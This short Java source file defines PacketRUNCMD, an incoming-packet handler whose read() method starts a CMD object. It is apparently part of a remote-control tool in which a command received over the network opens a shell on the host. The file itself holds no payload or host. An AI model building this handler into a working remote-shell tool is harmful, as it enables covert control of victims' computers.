package com.redpois0n.packets.in;

import com.redpois0n.CMD;

public class PacketRUNCMD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new CMD().start();
	}

}
